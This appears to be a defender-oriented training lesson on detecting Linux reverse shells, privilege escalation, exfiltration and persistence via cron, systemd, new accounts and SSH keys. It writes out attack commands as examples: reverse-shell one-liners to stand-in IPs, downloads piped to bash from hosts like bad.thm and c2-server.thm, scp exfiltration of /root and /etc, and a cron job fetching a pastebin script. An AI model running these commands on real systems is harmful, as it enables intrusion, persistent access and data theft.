## Reverse Shells

To combat the limitations, threat actors establish a reverse shell - a session from the victim to the attacker, a more convenient and often the only possible action to continue the attack. You can read about reverse shells in the [Shells Overview](https://tryhackme.com/room/shellsoverview) room, but let's focus on the detection part for this task. Below are three of the many methods to open a reverse shell on Linux:

|Command on the Victim|Explanation|
|---|---|
|`bash -i >& /dev/tcp/10.10.10.10/1337 0>&1`|The victim is forced to connect to 10.10.10.10:1337 and launch "bash" for the attacker.|
|`socat TCP:10.20.20.20:2525 EXEC:'bash',pty,stderr,setsid,sigint,sane`|Socat alternative to the above command. The attacker is listening at 10.20.20.20:2525.|
|`python3 -c '[...] s.connect(("10.30.30.30",80));pty.spawn("bash")'`|Python alternative to the above command. The attacker is listening at 10.30.30.30:80.|


## Privilege Escalation Basics

Another obstacle for attackers is insufficient privileges. Initial Access doesn't always mean a full system compromise, and web attacks and exploits often start as low-privilege service users. These users can sometimes be restricted to a single folder (e.g. /var/www/html) or have no ability to download and run malware. In this case, the attackers need [Privilege Escalation](https://attack.mitre.org/tactics/TA0004/), which can be achieved through various techniques. For example, to get to the root user, the threat actors may:

|Preceding Discovery (IF)|Privilege Escalation (THEN)|
|---|---|
|The `uname -a` shows an old, unpatched Ubuntu 16.04|Run an exploit like PwnKit: `wget http://bad.thm/pwnkit.sh \| bash`|
|The `find /bin -perm 4000` detects an `env` binary with the SUID flag|Use the SUID vulnerability to get root access: `/bin/env /bin/bash -p`|
|The `ls /etc/ssh` exposed an unprotected `ssh-backup-key` file|Try using the file to get root access: `ssh root@127.0.0.1 -i ssh-backup-key`|

## Detecting Privilege Escalation

Detecting Privilege Escalation might be tricky because of how different it can be: There are [hundreds](https://gtfobins.github.io/#+suid) of SUID misconfigurations and thousands of software vulnerabilities, each exploitable in its own unique way. Thus, a more universal approach would be to detect the surrounding events. For example, review the attack below which has just three steps: Discovery, Privilege Escalation, and Exfiltration after the "root" access is gained.

```bash
# Detection 1: A Spike of Discovery Commands
whoami                                                # Returns "www-data" user
id; pwd; ls -la; crontab -l                           # Basic initial Discovery
ps aux | egrep "edr|splunk|elastic"                   # Security tools Discovery
uname -r                                              # Returns an old 4.4 kernel

# Detection 2: A Download to Temp Directory
wget http://c2-server.thm/pwnkit.c -O /tmp/pwnkit.c   # Pwnkit exploit download
gcc /tmp/pwnkit.c -o /tmp/pwnkit                      # Pwnkit exploit compilation
chmod +x /tmp/pwnkit                                  # Making exploit executable
/tmp/pwnkit                                           # Trying to use the exploit

# Detection 3: Data Exfiltration With SCP
whoami                                                # Now returns "root" user
tar czf dump.tar.gz /root /etc/                       # Archiving sensitive data
scp dump.tar.gz attacker@c2-server.thm:~              # Exfiltrating the data
```

## Persistence in Linux

Standalone Linux servers can run for years without a single reboot and are often left untouched unless something breaks. Some threat actors rely on it and do not rush to establish [Persistence](https://attack.mitre.org/tactics/TA0003/). However, those aiming for long-term access often set up one or two additional backdoors. As in Windows, there are many ways threat actors persist on Linux. Let's start with the most common ones.

## Cron Persistence

Cron jobs are like scheduled tasks in Windows - they are the simplest way to run a process on schedule and the most popular persistence method. For example, as a part of a big espionage campaign, **APT29** deployed a fully-functional malware named GoldMax ([CrowdStrike blogpost](https://www.crowdstrike.com/en-us/blog/observations-from-the-stellarparticle-campaign/#:~:text=a%20crontab%20entry%20was%20created%20with%20a)). To ensure the malware survives a reboot, they added a new line to the victim's cron job file, located at `/var/spool/cron/<user>`.

```bash
# A line added by APT29 to /var/spool/cron/<user> to run malware on boot
@reboot nohup /home/<user>/.<hidden-directory>/<malware-name> > /dev/null 2>&1 &
```

Another example is **Rocke** cryptominer. After exploiting vulnerabilities in public-facing services like Redis or phpMyAdmin, Rocke downloads the cryptomining script from Pastebin and installs it as a `/etc/cron.d/root` cron job ([Red Canary blogpost](https://redcanary.com/blog/threat-detection/rocke-cryptominer/#:~:text=Rocke%20takes%20advantage%20of%20this%20to%20modify%20crontabs)). Note the `*/10` part, which means the script will be redownloaded every 10 minutes, likely to quickly restore its files in case the IT team accidentally deletes them.

```bash
# A simplified command that adds the cron job to /etc/cron.d/root
echo "*/10 * * * root (curl https://pastebin.com/raw/1NtRkBc3) | sh" > /etc/cron.d/root
```

## Systemd Persistence

Systemd services host the most critical system components. Nowadays, DNS, SSH, and nearly every web service are organized as separate .service files located at `/lib/systemd/system` or `/etc/systemd/system` folders. With "root" privileges, you can make your own services, as can the threat actors. For example, the **Sandworm** group once created a "cloud-online" service to enable its GOGETTER malware to run on reboot ([Mandiant report](https://cloud.google.com/blog/topics/threat-intelligence/sandworm-disrupts-power-ukraine-operational-technology/#:~:text=When%20leveraging%20GOGETTER%2C%20Sandworm%20utilized%20a%20Systemd%20service)).

```bash
# A simplified content of /lib/systemd/system/cloud-online.service file
[Unit]
Description=Initial cloud-online job    # Fake description to mimic a trusted service
[Service]
ExecStart=/usr/bin/cloud-online         # GOGETTER malware disguisted as a trus
```

## Account Persistence

The previous task was mainly about making the malware survive a reboot. But what about persistent access? As an attacker, you might want to return to the victim in a month to steal more data, but don't leave any malware there. How can you maintain access without malware? It all depends on how you entered in the first place.

## New User Account

If SSH is exposed, the attackers may create a new user account, add it to a privileged group, and then use it for further SSH logins. The detection is simple, too, as you can track the user creation events through authentication logs and then reconstruct the full process tree with auditd (by starting with `ausearch -i --ppid 27254` for the example below): 

Detecting New User Account

   `root@thm-vm:~$ cat /var/log/auth.log | grep -E 'useradd|usermod' 2025-09-18T15:46:30 thm-vm useradd[27254]: new group: name=support, GID=1001 2025-09-18T15:46:30 thm-vm useradd[27254]: new user: name=support, UID=1001, GID=1001, home=/home/support, shell=/bin/bash 2025-09-18T15:46:32 thm-vm usermod[27258]: add 'support' to group 'sudo' 2025-09-18T15:46:32 thm-vm usermod[27258]: add 'support' to shadow group 'sudo'`


## Backdoored SSH Keys

Another account persistence method is to backdoor the SSH keys of one of the users and use them for future logins instead of a password. You have already encountered this in the [Linux Threat Detection 2](https://tryhackme.com/room/linuxthreatdetection2) room, where Dota3 malware added its key to the breached user. This technique is difficult for IT to spot as malicious keys can blend in with legitimate ones. For example:

Adding SSH Backdoor

   `# Adding SSH backdoor to the authorized_keys root@thm-vm:~$ echo "AAAAC3Nza...IkiINvQt/R" >> ~/.ssh/authorized_keys  # It's hard to guess which key is a backdoor! root@thm-vm:~$ cat ~/.ssh/authorized_keys ssh-ed25519 AAAAC3Nza...oh5fpNy1Gi # Legitimate key ssh-ed25519 AAAAC3Nza...N9a2UYsFpQ # Legitimate key ssh-ed25519 AAAAC3Nza...IkiINvQt/R # Backdoor key`


By default, authorized SSH public keys are stored in each user's `~/.ssh/authorized_keys` file, so your best detection method is to monitor changes to these files using auditd. Note that relying on process creation events is ineffective, since there are numerous ways to modify SSH keys, some of which aren't properly traced with auditd. For example, `echo [key] >> ~/.ssh/authorized_keys` will not be logged, as echo is a [shell builtin](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html):

Detecting SSH Backdoor

   `# Traces of a backdoor created with "echo [key] >> ~/.ssh/authorized_keys"   # Note how the malicious "echo" command is logged simply as "bash" root@thm-vm:~$ ausearch -i -f /.ssh/authorized_keys type=PROCTITLE msg=audit(09/22/25 16:55:12.740:806) : proctitle=bash type=PATH msg=audit(09/22/25 16:55:12.740:806) : item=1 name=/home/user/.ssh/authorized_keys type=CWD msg=audit(09/22/25 16:55:12.740:806) : cwd=/ type=SYSCALL msg=audit(09/22/25 16:55:12.740:806) : syscall=openat [...] a2=O_WRONLY|O_CREAT|O_EXCL ppid=1265 pid=1310 uid=root exe=/usr/bin/vi key=systemd`


## Application Persistence

Imagine a WordPress website where the web admin account has been breached. With admin privileges, the attackers can add a backdoor (e.g. a [WSO web shell](https://www.wordfence.com/blog/2017/06/wso-shell/#:~:text=WSO%20is%20designed%20to%20be%20used%20via%20a%20web%20browser)) to the website and run commands through the backdoor - no cron jobs or SSH keys required! Moreover, because the persistence lives in the application layer, auditd and system logs often never see it.

While app-level persistence is beyond the scope of this room, you should be aware that it's a possible and common scenario. If you verified all possible persistence techniques, but malware somehow reappears after some time, one of your public-facing apps might be compromised!